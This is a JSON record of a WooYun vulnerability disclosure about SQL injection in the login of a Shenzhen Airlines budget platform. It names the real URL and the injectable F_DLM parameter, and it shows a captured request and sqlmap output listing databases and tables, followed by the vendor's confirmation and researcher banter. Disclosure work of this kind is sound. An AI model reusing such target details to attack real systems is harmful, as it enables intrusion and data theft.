{"id": 7847, "wybug_id": "wooyun-2013-040152", "wybug_title": "深圳航空某系统SQL注射漏洞海量数据", "wybug_corp": "深圳航空", "wybug_author": "小胖子", "wybug_date": "2013-10-18 10:42", "wybug_open_date": "2013-12-02 10:43", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-02：\t细节向公众公开  简要描述： 哇咔咔，ATM来了！ 详细说明：  漏洞系统地址：全面预算应用平台 aspx+oracle\nhttp://cw-info.shenzhenair.com/QMYS/Web/Login.aspx\n登陆处没有做过滤，导致登陆框注入。抓登陆包。\nPOST /QMYS/Web/LoginCheck.aspx HTTP/1.1Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/x-ms-xbap, application/x-ms-application, */*Referer: http://cw-info.shenzhenair.com/QMYS/Web/Login.aspxAccept-Language: zh-cnContent-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E)Host: cw-info.shenzhenair.comContent-Length: 76Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=rivobj21bxefuf55b3q1em55; Seeyon_Q_Cookies=GUID_IP=fe2cab85-abf0-4c5b-b665-2742c5a8c42fF_DLM=admin&F_MM=admin&statedatetime=Fri+Oct+18+10%3A26%3A13+UTC%2B0800+2013\nF_DLM参数存在注入。\n\n注入得到的数据库：\navailable databases [3]:[*] CWYS2[*] SYS[*] SYSTEMcurrent schema (equivalent to database on Oracle):    'CWYS2'\n当前数据库CWYS2的表有300多个，不读取了，你们速度修复吧。\n[10:30:02] [INFO] the SQL query used returns 369 entries[10:30:03] [INFO] retrieved: TB_ZX_SKDWXXB_20110112[10:30:04] [INFO] retrieved: TB_ZX_BDMXB_20110112[10:30:04] [INFO] retrieved: TB_ZX_BDZB_20110112[10:30:06] [INFO] retrieved: XY_DEL_ZX_BDZB[10:30:07] [INFO] retrieved: TB_ZX_YHFKDFPXX[10:30:08] [INFO] retrieved: TMP_XX[10:30:08] [INFO] retrieved: NS_STATS[10:30:09] [INFO] retrieved: TB_XT_GNML_20101008[10:30:10] [INFO] retrieved: TB_YS_YSNDTXB_20101008[10:30:10] [INFO] retrieved: TB_YS_NDHZB_20130106[10:30:11] [INFO] retrieved: TB_YS_YSBDMXB_20100628\n   漏洞证明：  见详细说明。   修复方案：  0x1：任何用户输入，都要过滤了。0x2：求20rank   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-18 14:02 厂商回复： 感谢您对深航信息系统的关注和帮助，我们将尽快排查程序修补漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-18 10:45 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  你个贱淫 我刚找到一个提款 就被你这个贱淫给霸占了！擦.....    \n     2013-10-18 10:46 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  刚找到深圳航空的Ip段，你就……    \n     2013-10-18 10:49 |    \t\tX防部 \t\t\t( 普通白帽子  |\t\t\t        Rank:487 漏洞数:137        )\t\t \n  你这贱淫你让俺们屌丝怎么活啊？？？    \n     2013-10-18 12:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你们是约好的么    \n     2013-10-18 13:03 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser 没有啊，我看到新厂商或者ATM我就激动！    \n     2013-10-18 14:09 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  我去刚刚找到，发出来就重复了，今天真是风水不好呀！！    \n     2013-10-18 14:22 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @小胖子 哟喂，超越一哥的节奏呀    \n     2013-10-18 14:26 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @se55i0n 不会的，休息休息，换马甲！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}